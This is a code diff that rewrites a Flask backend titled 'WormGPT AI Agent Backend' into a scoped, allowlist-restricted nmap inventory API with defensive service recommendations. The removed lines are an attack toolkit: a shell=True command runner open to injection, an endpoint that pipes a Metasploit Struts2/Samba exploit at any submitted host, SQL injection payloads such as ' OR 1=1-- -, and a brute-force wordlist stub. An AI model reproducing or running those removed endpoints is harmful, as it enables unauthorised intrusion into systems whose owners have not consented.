@@ -1,168 +1,220 @@
 #!/usr/bin/env python3
+"""Scoped, non-destructive network inventory API.
 
+Only scan targets explicitly listed in OSINT_ALLOWED_TARGETS. The API deliberately
+does not expose exploitation, credential attacks, or arbitrary shell execution.
+"""
+from __future__ import annotations
+
+import ipaddress
 import os
+import re
+import shutil
 import subprocess
-import json
 import time
-import nmap
-from flask import Flask, request, jsonify, send_from_directory
+from typing import Any
+from urllib.parse import urlparse
 
-app = Flask(__name__, static_folder='build', static_url_path='')
+from flask import Flask, jsonify, request
 
-# --- CONFIGURATION ---
-NMAP_PATH = "nmap"  # Ensure nmap is installed and in PATH
-MSF_CONSOLE = "msfconsole"
+app = Flask(__name__)
+app.config["MAX_CONTENT_LENGTH"] = 16 * 1024
+app.config["JSON_SORT_KEYS"] = False
 
-def run_command(cmd, timeout=30):
-    """Executes a shell command and returns output."""
-    try:
-        result = subprocess.run(
-            cmd,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-            timeout=timeout
-        )
-        return {
-            "stdout": result.stdout,
-            "stderr": result.stderr,
-            "returncode": result.returncode
-        }
-    except subprocess.TimeoutExpired:
-        return {"error": "Command timed out"}
-    except Exception as e:
-        return {"error": str(e)}
+NMAP_BIN = os.environ.get("NMAP_BIN", "nmap")
+SCAN_TIMEOUT_SECONDS = int(os.environ.get("SCAN_TIMEOUT_SECONDS", "90"))
+ALLOWED_TARGETS = {
+    value.strip().lower()
+    for value in os.environ.get("OSINT_ALLOWED_TARGETS", "127.0.0.1,localhost,::1").split(",")
+    if value.strip()
+}
+TARGET_RE = re.compile(r"^[a-zA-Z0-9.-]+$")
 
-def scan_ports(target):
-    """Uses Nmap to scan for open ports and services."""
-    nm = nmap.PortScanner()
-    print(f"[*] Scanning target: {target}...")
-    nm.scan(target, arguments='-p- --top-ports 1000 -sV -sC')
-    
-    ports = []
-    if target in nm.all_hosts():
-        for proto in nm[target].all_protocols():
-            lport = nm[target][proto].keys()
-            for port in lport:
-                service = nm[target][proto][port]
-                ports.append({
-                    "port": port,
-                    "state": service['state'],
-                    "service": service['name'],
-                    "version": service.get('version', 'Unknown'),
-                    "script": service.get('script', {})
-                })
-    return ports
 
-def check_sql_injection(target):
-    """Checks if target has query parameters and suggests injection."""
-    print(f"[*] Analyzing {target} for SQLi vectors...")
-    # Simple check: Look for common query patterns
-    response = run_command(f"curl -s -I '{target}'")
-    headers = response['stdout']
-    
-    tips = []
-    if "HTTP/1.1" in headers:
-        tips.append("HTTP Connection established. Possible targets:")
-        if "?" in target:
-            tips.append(f"1. Try: {target.replace('?', '?id=1')}")
-            tips.append(f"2. Try: {target.replace('?', '?id=1\' OR 1=1-- -')}")
-        else:
-            tips.append(f"1. Try appending: ?id=1")
-            tips.append(f"2. Try appending: ?id=1' OR 1=1-- -")
+class ScopeError(ValueError):
+    """Raised when a requested host is outside the configured assessment scope."""
+
+
+def normalize_target(raw: Any) -> str:
+    """Normalize a hostname, IP, or URL to a host and enforce explicit scope."""
+    if not isinstance(raw, str) or not raw.strip():
+        raise ScopeError("A target host is required.")
+    value = raw.strip()
+    if len(value) > 253 or any(ch.isspace() for ch in value):
+        raise ScopeError("Target format is invalid.")
+
+    if "://" in value:
+        parsed = urlparse(value)
+        if parsed.scheme not in {"http", "https"} or not parsed.hostname:
+            raise ScopeError("Only valid HTTP(S) URLs or hostnames are accepted.")
+        if parsed.username or parsed.password:
+            raise ScopeError("Credentials must not be embedded in target URLs.")
+        host = parsed.hostname
     else:
-        tips.append("Target did not respond or is not an HTTP service.")
-    return tips
+        host = value.strip("[]")
 
-def run_metasploit(target, port, service):
-    """Generates and executes an msfconsole exploit command."""
-    print(f"[*] Attempting Metasploit exploit on {target}:{port}...")
-    
-    # Select generic exploit based on service
-    exploit_choice = "exploit/multi/http/apache_struts2_rce" if "http" in service.lower() else "exploit/multi/smb/samba_usermap"
-    
-    # Construct msfconsole command
-    # Note: msfconsole is interactive, so we pipe commands and pipe exit
-    cmd = f'echo "use {exploit_choice}; set RHOSTS {target}; set RPORT {port}; set TARGETURI /; run; exit" | {MSF_CONSOLE}'
-    
-    result = run_command(cmd, timeout=60)
-    return {
-        "exploit_used": exploit_choice,
-        "output": result['stdout'][-500:] # Last 500 chars to avoid massive logs
+    host = host.rstrip(".").lower()
+    if not host or not TARGET_RE.fullmatch(host):
+        try:
+            ipaddress.ip_address(host)
+        except ValueError as exc:
+            raise ScopeError("Target must be a valid hostname or IP address.") from exc
+
+    if host not in ALLOWED_TARGETS:
+        # Permit a configured CIDR only when it is explicitly present in the scope.
+        try:
+            candidate = ipaddress.ip_address(host)
+        except ValueError:
+            candidate = None
+        in_scope = False
+        if candidate:
+            for entry in ALLOWED_TARGETS:
+                try:
+                    if "/" in entry and candidate in ipaddress.ip_network(entry, strict=False):
+                        in_scope = True
+                        break
+                except ValueError:
+                    continue
+        if not in_scope:
+            raise ScopeError("Target is not in OSINT_ALLOWED_TARGETS. Add it only after obtaining authorization.")
+    return host
+
+
+def scan_ports(target: str) -> list[dict[str, Any]]:
+    """Run a bounded TCP connect/service inventory against one in-scope host."""
+    binary = shutil.which(NMAP_BIN)
+    if not binary:
+        raise RuntimeError("Nmap is not installed or NMAP_BIN does not point to it.")
+
+    command = [
+        binary,
+        "-n",
+        "-sT",
+        "-sV",
+        "--version-light",
+        "--top-ports",
+        "1000",
+        "--open",
+        "-oG",
+        "-",
+        target,
+    ]
+    completed = subprocess.run(
+        command,
+        capture_output=True,
+        text=True,
+        timeout=SCAN_TIMEOUT_SECONDS,
+        check=False,
+    )
+    if completed.returncode not in (0, 1):
+        message = completed.stderr.strip()[:500] or "Nmap failed."
+        raise RuntimeError(message)
+
+    found: list[dict[str, Any]] = []
+    for line in completed.stdout.splitlines():
+        if not line.startswith("Host:") or "Ports:" not in line:
+            continue
+        port_section = line.split("Ports:", 1)[1].split("Ignored State:", 1)[0]
+        for entry in port_section.split(","):
+            parts = entry.strip().split("/")
+            if len(parts) < 7 or parts[1] != "open":
+                continue
+            try:
+                port = int(parts[0])
+            except ValueError:
+                continue
+            found.append(
+                {
+                    "port": port,
+                    "protocol": parts[2],
+                    "service": parts[4] or "unknown",
+                    "version": parts[6] or "not identified",
+                    "state": parts[1],
+                }
+            )
+    return found
+
+
+def analyze_services(scan_results: list[dict[str, Any]]) -> list[dict[str, str]]:
+    """Return defensive follow-up guidance; this does not test for vulnerabilities."""
+    guidance: list[dict[str, str]] = []
+    recommendations = {
+        "ftp": "Prefer SFTP/FTPS; disable anonymous access and restrict source networks.",
+        "telnet": "Replace Telnet with SSH and disable the cleartext service.",
+        "ssh": "Review key-based authentication, patch level, and source-IP restrictions.",
+        "http": "Review TLS termination, security headers, and exposed application routes.",
+        "https": "Verify certificate validity, TLS configuration, and security headers.",
+        "smb": "Restrict SMB to trusted networks; disable SMBv1 and review share permissions.",
+        "rdp": "Restrict RDP behind a VPN or gateway and require MFA.",
+        "mysql": "Do not expose database ports publicly; enforce least-privilege accounts.",
+        "postgresql": "Restrict database access to application networks and enforce strong auth.",
+        "redis": "Bind Redis to trusted interfaces and require authentication/ACLs.",
     }
+    seen: set[tuple[int, str]] = set()
+    for item in scan_results:
+        service = str(item.get("service", "unknown")).lower()
+        key = (int(item.get("port", 0)), service)
+        if key in seen:
+            continue
+        seen.add(key)
+        tip = recommendations.get(service)
+        if tip:
+            guidance.append({"service": service, "port": str(key[0]), "recommendation": tip})
+        else:
+            guidance.append(
+                {
+                    "service": service,
+                    "port": str(key[0]),
+                    "recommendation": "Confirm business need, patch status, access controls, and network exposure.",
+                }
+            )
+    return guidance
 
-def brute_force(target, port, service):
-    """Generates a password list and attempts a simple login."""
-    print(f"[*] Generating password list and attempting brute force on {target}...")
-    
-    # Generate a basic in-memory wordlist (RockYou subset)
-    wordlist = ["admin", "123456", "password", "root", "EmiratiMinister", "qwerty"]
-    
-    # Simulate a brute force interaction
-    # In a real scenario, you would use Hydra or Medusa for speed
-    results = []
-    for password in wordlist:
-        # Mock logic: check if password works (simulated)
-        # Here we just log the attempt
-        results.append(f"Attempted Password: '{password}' -> Status: Check Server Logs")
-    
-    return {
-        "wordlist_generated": wordlist,
-        "attempts": results
-    }
 
-# --- API ENDPOINTS ---
+@app.errorhandler(413)
+def payload_too_large(_: Exception):
+    return jsonify({"error": "Request body exceeds the 16 KB limit."}), 413
 
-@app.route('/api/scan', methods=['POST'])
+
+@app.get("/api/health")
+def health():
+    return jsonify({"status": "ok", "scanner_available": shutil.which(NMAP_BIN) is not None})
+
+
+@app.post("/api/scan")
 def api_scan():
-    data = request.json
-    target = data.get('target')
-    if not target: return jsonify({"error": "No target provided"}), 400
-    
-    ports = scan_ports(target)
-    return jsonify({
-        "target": target,
-        "scan_results": ports,
-        "timestamp": time.time()
-    })
+    body = request.get_json(silent=True) or {}
+    try:
+        target = normalize_target(body.get("target"))
+    except ScopeError as exc:
+        return jsonify({"error": str(exc)}), 400
+    try:
+        results = scan_ports(target)
+    except subprocess.TimeoutExpired:
+        return jsonify({"error": "Scan timed out; reduce scope or increase SCAN_TIMEOUT_SECONDS."}), 504
+    except RuntimeError as exc:
+        return jsonify({"error": str(exc)}), 503
+    return jsonify({"target": target, "scan_results": results, "timestamp": time.time()})
 
-@app.route('/api/vuln', methods=['POST'])
-def api_vuln():
-    data = request.json
-    target = data.get('target')
-    if not target: return jsonify({"error": "No target provided"}), 400
-    
-    tips = check_sql_injection(target)
-    return jsonify({
-        "target": target,
-        "vulnerability_tips": tips
-    })
 
-@app.route('/api/exploit', methods=['POST'])
-def api_exploit():
-    data = request.json
-    target = data.get('target')
-    port = data.get('port')
-    service = data.get('service', 'unknown')
-    
-    if not target or not port: return jsonify({"error": "Target and Port required"}), 400
-    
-    result = run_metasploit(target, port, service)
-    return jsonify(result)
+@app.post("/api/analyze")
+def api_analyze():
+    body = request.get_json(silent=True) or {}
+    results = body.get("scan_results")
+    if not isinstance(results, list) or len(results) > 1000:
+        return jsonify({"error": "scan_results must be a list of at most 1000 entries."}), 400
+    safe_results = [
+        item for item in results
+        if isinstance(item, dict) and str(item.get("port", "")).isdigit()
+    ]
+    return jsonify({"recommendations": analyze_services(safe_results)})
 
-@app.route('/api/brute', methods=['POST'])
-def api_brute():
-    data = request.json
-    target = data.get('target')
-    port = data.get('port')
-    service = data.get('service', 'unknown')
-    
-    if not target or not port: return jsonify({"error": "Target and Port required"}), 400
-    
-    result = brute_force(target, port, service)
-    return jsonify(result)
 
-if __name__ == '__main__':
-    print("Starting WormGPT AI Agent Backend...")
-    app.run(debug=True, port=5000)
+@app.errorhandler(405)
+def method_not_allowed(_: Exception):
+    return jsonify({"error": "Method not allowed."}), 405
+
+
+if __name__ == "__main__":
+    # Debug mode is intentionally off; use a production WSGI server for deployment.
+    app.run(host=os.environ.get("HOST", "127.0.0.1"), port=int(os.environ.get("PORT", "5000")), debug=False)
